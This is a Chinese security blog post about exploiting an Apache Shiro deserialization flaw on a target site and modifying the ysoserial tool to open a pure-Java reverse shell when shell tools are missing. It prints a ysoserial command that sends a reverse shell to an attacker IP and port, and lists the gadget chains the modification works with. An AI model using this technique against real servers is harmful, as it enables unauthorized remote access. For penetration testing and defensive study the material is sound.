\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/8f80Fezs86DD9R1iRqLhMg)

这是 **酒仙桥六号部队** 的第 **106** 篇文章。

全文共计 1809 个字，预计阅读时长 6 分钟。

**背景**

某天闲着无聊，小伙伴发来一个某网站，说只能执行命令，不能反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesm3uiaxcHmzlAmOKmy9YacgIv3xvUSXk50TshiaibRMSRHLBiaYPJ12aVibIw/640?wx_fmt=jpeg)

**测试**

对着目标站点一顿测试。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmMamA8I3HxO5hwu8uCTS6qlvqo42e1DXLQrW4QBsbib21pd2mHLXJibxw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmFWqQzZvK3ibUb7uo0icTteHn9nN7gIhaOB8xBKEyR9JNNqRicCP6FVDFQ/640?wx_fmt=jpeg)

发现确实存在 shiro 反序列化，并且存在可以利用的 gadget。

**利用**

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmcAwCfl8HXUHAqUQG573Ctlh6CFlFAXgFBpAQFO13hricC9iadj8uYyMQ/640?wx_fmt=jpeg)

发现确实可以执行命令，但是我们执行反弹的时候。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmbpuHq2XQQ35ayAr72pHCpXnPJd0j3SdWsDc0tiamg5oIzfKV582vmSg/640?wx_fmt=jpeg)

反弹不回来，emmm。

查看各种系命令以及分析。

发现是一个精简的 Linux，经常用于 docker 环境的搭建。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmU07aa73P6dduau91EgliaQewQibDmJ0veAMAItbtVwnl2P7ibH3jOSEvQ/640?wx_fmt=jpeg)

并没有 bash 环境。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmyk2Msicf8aL2a0GM12pHcCUM2zpr7V6Cta5yJQmaw2jdnk36IiaItsmg/640?wx_fmt=jpeg)

使用 sh 命令反弹结果一样，之后尝试了各种反弹的方法，一言难尽。

所以我们需要一种新的反弹方法，利用 java 直接创建一个 socket 反弹。

**ysoserial**

ysoserial 是一款在 Github 开源的知名 java 反序列化利用工具，里面集合了各种 java 反序列化 payload。

源码下载地址：

https://codeload.github.com/frohoff/ysoserial/zip/master

在很多 java 类的反序列化攻击场景中会利用到该工具。

例如：apache shiro 反序列化，会使用 ysoserial 生成反序列化语句，再使用 key 加密，发送攻击 payload。

如下 python 脚本，就是利用 ysoserial 生成反序列化语句，再用 key 加密生成 cookie。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmVZov1Bh6T6iaYcadEibL4aoxPW2VYdfCt5ia3OB6M8RsoMO4M51AibAjYg/640?wx_fmt=jpeg)

**目的**

各种各样的反弹 shell 注入 bash、sh、perl、nc、python 等等，都比较依赖目标系统的环境和操作系统类型等等，如果可以直接利用 java 创建一个 socket 反弹 shell 则可以无需关心这些环境直接反弹 shell。

**ysoserial 分析**

在执行 ysoserial 的时候一般使用的命令是 java -cp ysoserial.jar  / 某个 payload/ / 命令 /

打开源码分析对应的 payload 类执行过程，如 CommonsCollections2。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmaCibMKrsuf1iapBkWgd9foNlXianPzf1OyiaGHptJDjfGhIw6sIDQGmD1w/640?wx_fmt=jpeg)

在执行该类的时候，运行 payloadrunner 类的 run 方法，来执行本类的 class 文件，再加上接收的参数，跟入 payloadrunner 类。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesm7ic8ogQ4xYWvDzAYfPcz3aGI0teJS9VMjzGciaOhUQqw4icbSW3gjz9lA/640?wx_fmt=jpeg)

这里会调用 payload 中的 getObject 方法传入要执行的命令，命令是接收的输入或者是 getDefaultTestCmd()，也就是说我们如果不输入命令，他会执行以下默认命令。

```
Windows:calc

MacOS:calculator

Linux:gnome-calculator\\kclac
```

如果输入了命令会执行自定义命令，接下来会执行 getObject 方法 () 来生成 payload，跟入对应类的 getObject 方法。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesm9DuAA6kMIGeaP7kiaDVklAW1O2CCYkgoggx3WnbspWjaR6r8nCHhlbA/640?wx_fmt=jpeg)

getObject 方法中，调用 Gadgets 类中的 createTemplatesImpl 方法生成临时的 java 字节码文件，跟入对应的方法。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmFt3xE3xgibicgR3hEVffKfuZicMgYficZ0mnF1UkqDB5DkaILvTaMZoM0w/640?wx_fmt=jpeg)

**ysoserial 改造**

可以看到作者在命令获取处已经留下了注释。

待做: 也可以做一些有趣的事情，比如注入一个纯 JavaRev/BindShell 来绕过幼稚的保护。

```
TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
```

一般情况我们在 ysoserial 后面写的命令调用的是 java.lang.Runtime.getRuntime().exec() 方法来执行命令，写死了，此处我们可以进行改造。

在原来的代码基础上写成：

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmyAd7hODvrBotGZ0Pe5gKVWjnQKqEGDIgWnMsB8raIHIq7zvZpoicFicQ/640?wx_fmt=jpeg)

这样我们再重新打包 ysoserial 文件再执行命令时使用如下格式。

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "rebound:ip port"
```

可以直接获得一个反弹 shell。

**生成 payload 利用**

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmDnfPiafYuqY5VphMGWdb9HmBCs7dSISC2PI2bWAWNvZ0uDCmOXNOgVg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmV2ANfaCUHdGD51PE3l7wC6orKJPic6LQ9buDw7oK95riaX4KEphY2eGg/640?wx_fmt=jpeg)

发送。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmmymnwFAqqTaNCPE8XC7fpmXT4zxTkFR93DFTClQHhjrfm1G5oUxRfA/640?wx_fmt=jpeg)

Bingo，得到一个反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s5448GzS2Fqrm9DKsA9jkesmsYzulcHPRB0YN76AGtSSeR58gIVFWoUV9gx6GSMzmckTqlX6vhtf4g/640?wx_fmt=jpeg)

**ysoserial 改造总结**

由于不是所有的 payload 在构造时都调用了 Gadgets.createTemplatesImpl, 所以只有以下几种适用于以上修改。

```
CommonsBeanutils1

CommonsCollections2

CommonsCollections3

CommonsCollections4

Hibernate1

JavassistWeld1

JBossInterceptors1

Jdk7u21

JSON1

ROME

Spring1

Spring2

Vaadin1
```

此方法不依赖于目标操作系统和组件，可以直接利用 java 创建反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s564Abiad4b2nUggeFBz8QyCib3lXZ8VOn2rZTucMwvh4zy1ILxSAqsCmou2iaVOcctFp6hibwLC721K8g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/WTOrX1w0s564Abiad4b2nUggeFBz8QyCibiaRBNn0A5YI88OyFjU8fn2Isf9bat4vQn18NwG6cXxVOSuKiapNm2nibQ/640?wx_fmt=png)